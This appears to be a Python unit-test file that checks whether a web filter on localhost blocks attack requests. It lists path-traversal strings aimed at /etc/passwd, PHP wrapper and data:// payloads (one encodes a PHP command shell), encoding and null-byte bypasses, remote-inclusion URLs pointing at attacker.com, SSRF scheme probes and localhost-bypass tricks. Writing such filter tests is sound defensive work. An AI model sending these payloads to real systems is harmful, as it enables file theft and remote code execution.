import unittest

import requests


class TestFileInclusion(unittest.TestCase):
    def setUp(self):
        self.domain = "localhost:8000"
        self.url = "http://" + self.domain + "/"

    def test_sanity(self):
        self.assertEqual(True, True)

    def test_good_packet(self):
        urls = ["",
                "WebGoat",
                "WebGoat/login?error",
                "WebGoat/register.mvc",
                "index.php"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertNotEqual(403, response.status_code,
                                    "False Positive on URL '" + self.url + i + "'" + " with status code " + str(
                                        response.status_code))

    def test_path_traversal(self):
        urls = ["index.php?page=../../../etc/passwd",
                "index.php?page=....//....//....//etc/passwd",
                "index.php?page=....\/....\/....\/etc/passwd"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
                                     response.status_code))

    def test_php_wrapper(self):
        urls = ["index.php?page=php://filter/read=string.rot13/resource=index.php",
                "index.php?page=php://filter/convert.base64-encode/resource=index.php",
                "index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php",
                "index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
                "index.php?page=zip://shell.jpg%23payload.php",
                "?page=data://text/plain,<?php echo base64_encode(file_get_contents(“index.php”)); ?>\"",
                "?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
                                     response.status_code))

    def test_encoding(self):
        urls = ["index.php?page=..%252f..%252f..%252fetc%252fpasswd",
                "index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "index.php?page=%252e%252e%252fetc%252fpasswd",
                "index.php?page=%252e%252e%252fetc%252fpasswd%00"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
                                     response.status_code))

    def test_null_byte_injection(self):
        urls = ["index.php?page=../../../etc/passwd%00"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
                                     response.status_code))

    def test_access_folder(self):
        urls = ["index.php?page=utils/scripts/../../../../../etc/passwd"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
                                     response.status_code))

    def test_path_truncation(self):
        urls = ["index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\.\.",
                "index.php?page=a/../../../../../../../../../etc/passwd/./././././.",
                "index.php?page=a/././etc/passwd",
                "index.php?page=a/../../../../../../../../../etc/passwd"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
                                     response.status_code))

    def test_rfi(self):
        urls = ["index.php?page=http://atacker.com/evil.php",
                "index.php?page=\\attacker.com\evil.php"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
                                     response.status_code))

    def test_filter_bypass(self):
        urls = ["index.php?page=....//....//etc/passwd",
                "index.php?page=..///////..////..//////etc/passwd",
                "index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
                "index.php?page=/var/www/../../etc/passwd",
                "index.php?page=../../../etc/passwd",
                "index.php?page=....//....//....//etc/passwd",
                "index.php?page=....\/....\/....\/etc/passwd",
                "static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
                                     response.status_code))

    def test_ssrf_wrappers(self):
        urls = ["foo/bar?vuln-function=http://127.0.0.1:8888/secret",
                "index?page=dict://",
                "index?page=expect://",
                "index?page=fd://",
                "index?page=file://",
                "index?page=file:///",
                "index?page=ftp://",
                "index?page=gopher://",
                "index?page=http://",
                "index?page=https://",
                "index?page=imap://",
                "index?page=jar:ftp://local-domain.com!/",
                "index?page=jar:http://0.0.0.0!/",
                "index?page=jar:http://127.0.0.1!/",
                "index?page=jar:http://localhost!/",
                "index?page=jar:proto-schema://blah!/",
                "index?page=ldap://",
                "index?page=mailto://",
                "index?page=netdoc:///etc/hosts",
                "index?page=netdoc:///etc/passwd",
                "index?page=ogg://",
                "index?page=pop3://",
                "index?page=sftp://",
                "index?page=smtp://",
                "index?page=ssh2://",
                "index?page=ssh://",
                "index?page=telnet://",
                "index?page=tftp://"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
                                     response.status_code))

"""
    def test_localhost_bypass(self):
        urls = ["127.0.0.1:80",
                "127.0.0.1:443",
                "127.0.0.1:22",
                "127.1:80",
                "0",
                "0.0.0.0:80",
                "①②⑦.⓪.⓪.⓪",
                "127.127.127.127",
                "127.0.1.3",
                "127.0.0.0",
                "2130706433/",
                "017700000001",
                "3232235521/",
                "3232235777/",
                "0x7f000001/",
                "0xc0a80014/",
                self.domain + "@127.0.0.1",
                "127.0.0.1#" + self.domain,
                self.domain + ".127.0.0.1",
                "127.0.0.1/" + self.domain,
                "127.0.0.1/?d=" + self.domain,
                self.domain + "@127.0.0.1",
                "127.0.0.1#" + self.domain,
                self.domain + ".127.0.0.1",
                "127.0.0.1/" + self.domain,
                "127.0.0.1/?d=" + self.domain,
                self.domain + "@localhost",
                "localhost#" + self.domain,
                self.domain + ".localhost",
                "localhost/" + self.domain,
                "localhost/?d=" + self.domain,
                "127.0.0.1%00" + self.domain,
                "127.0.0.1?" + self.domain,
                "127.0.0.1///" + self.domain,
                "127.0.0.1%00" + self.domain,
                "127.0.0.1?" + self.domain,
                "127.0.0.1///" + self.domain + "st:+11211aaa",
                "st:00011211aaaa",
                "0/",
                "127.1",
                "127.0.1",
                "1.1.1.1 &@2.2.2.2# @3.3.3.3/",
                "127.1.1.1:80\@127.2.2.2:80/",
                "127.1.1.1:80\@@127.2.2.2:80/",
                "127.1.1.1:80:\@@127.2.2.2:80/",
                "127.1.1.1:80#\@127.2.2.2:80/",
                "[::]:80/",
                "[::]:25/ SMTP",
                "[::]:3128/ Squid",
                "[0000::1]:80/",
                "[0:0:0:0:0:ffff:127.0.0.1]/thefile"]

        for i in urls:
            with self.subTest(i=i):
                try:
                    response = requests.get("http://" + i, timeout=1)
                    self.assertEqual(403, response.status_code,
                                     "False Negative on URL 'http://" + i + "'" + " with status code " + str(response.status_code))
                except requests.exceptions.RequestException as e:  # This is the correct syntax
                    self.assertIsNotNone(e, "Unknown error on URL 'http://" + i + "'")
"""

if __name__ == '__main__':
    unittest.main()
